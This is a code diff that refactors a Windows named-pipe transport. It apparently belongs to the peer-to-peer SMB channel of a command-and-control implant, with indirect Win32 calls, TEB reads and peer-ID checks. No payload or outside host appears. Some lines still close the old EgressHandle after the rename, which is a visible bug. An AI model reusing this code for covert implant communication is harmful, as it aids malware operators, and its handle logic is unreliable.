@@ -333,6 +333,23 @@ defer:
 			return true;
 		}
 
+		// NOTE: SMB peers create their own server, other nodes connect through a "node push".
+		BOOL PipeCreateServer() {
+			SMB_PIPE_SEC_ATTR smbSecAttr  	= { };
+			SECURITY_ATTRIBUTES secAttr 	= { };
+
+			SmbInitContext(&smbSecAttr, &secAttr);
+
+			Ctx->Transport.PipeHandle = Ctx->Win32.CreateNamedPipeW( 
+					Ctx->Transport.PipeName, 
+					PIPE_ACCESS_DUPLEX, 
+					PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 
+					PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &secAttr);
+
+			SmbDestroyContext(&smbSecAttr);
+			return (Ctx->Transport.PipeHandle != INVALID_HANDLE_VALUE);
+		}
+
         BOOL PipeRead(HANDLE handle, PACKET *inPack) {
             DWORD read   = 0;
             DWORD total  = 0;
@@ -369,30 +386,20 @@ defer:
             SMB_PIPE_SEC_ATTR smbSecAttr  = { };
             SECURITY_ATTRIBUTES secAttr    = { };
 
-			if (!Ctx->Transport.EgressHandle) {
-				SmbInitContext(&smbSecAttr, &secAttr);
-
-				Ctx->Transport.EgressHandle = Ctx->Win32.CreateNamedPipeW(
-						Ctx->Transport.EgressName, 
-						PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 
-						PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &secAttr);
-
-				if (!Ctx->Transport.EgressHandle || Ctx->Transport.EgressHandle == INVALID_HANDLE_VALUE) {
+			if (!Ctx->Transport.PipeHandle) {
+				if (!PipeCreateServer()) {
 					return false;
 				}
-
-				SmbDestroyContext(&smbSecAttr);
-
-				if (!Ctx->Win32.ConnectNamedPipe(Ctx->Transport.EgressHandle, nullptr)) {
+				if (!Ctx->Win32.ConnectNamedPipe(Ctx->Transport.PipeHandle, nullptr)) {
 					Ctx->Win32.NtClose(Ctx->Transport.EgressHandle);
 					return false;
 				}
 			}
 
-            if (!PipeWrite(Ctx->Transport.EgressHandle, outPack)) {
+            if (!PipeWrite(Ctx->Transport.PipeHandle, outPack)) {
                 if (Ctx->Teb->LastErrorValue == ERROR_NO_DATA) {
 
-                    if (Ctx->Transport.EgressHandle) {
+                    if (Ctx->Transport.PipeHandle) {
                         Ctx->Win32.NtClose(Ctx->Transport.EgressHandle);
                     }
                     return false;
@@ -401,37 +408,36 @@ defer:
             return true;
         }
 
-		// NOTE: Change to pull packets regardless of peer id. Check for TransportType instead.
         BOOL PipeReceive(PACKET** inPack) {
-            DWORD peerId    = 0;
-            DWORD msgSize   = 0;
+            DWORD peerId 	= 0;
+            DWORD msgSize  	= 0;
             DWORD total 	= 0;
 
             *inPack = CreatePacket();
-            if (Ctx->Win32.PeekNamedPipe(Ctx->Transport.EgressHandle, nullptr, 0, nullptr, &total, nullptr)) {
-                if (total > sizeof(uint32_t) * 2) {
+            if (Ctx->Win32.PeekNamedPipe(Ctx->Transport.PipeHandle, nullptr, 0, nullptr, &total, nullptr)) {
 
-                    if (!Ctx->Win32.ReadFile(Ctx->Transport.EgressHandle, &peerId, sizeof(DWORD), &total, nullptr)) {
+                if (total > sizeof(UINT32) * 2) {
+                    if (!Ctx->Win32.ReadFile(Ctx->Transport.PipeHandle, &peerId, sizeof(DWORD), &total, nullptr)) {
+						if (Ctx->Teb->LastErrorValue != ERROR_MORE_DATA) {
+							return false;
+						}
+                    }
+                    if (peerId != Ctx->Config.PeerId) {
                         return false;
                     }
-                    if (Ctx->Config.PeerId != peerId) {
-                        return false;
-                    }
-                    if (!Ctx->win32.ReadFile(ctx->transport.egress_handle, &msgSize, sizeof(uint32_t), &total, nullptr)) {
-                        if (ntstatus != ERROR_MORE_DATA) {
+                    if (!Ctx->Win32.ReadFile(Ctx->Transport.PipeHandle, &msgSize, sizeof(UINT32), &total, nullptr)) {
+                        if (Ctx->Teb->LastErrorValue != ERROR_MORE_DATA) {
                             return false;
                         }
                     }
-
-                    if (!PipeRead(ctx->transport.egress_handle, *in)) {
-                        if (*in) {
-                            DestroyPacket(*in);
+                    if (!PipeRead(Ctx->Transport.PipeHandle, *inPack)) {
+                        if (*inPack) {
+                            DestroyPacket(*inPack);
                         }
                         return false;
                     }
                 }
             }
-
             return true;
         }
     }
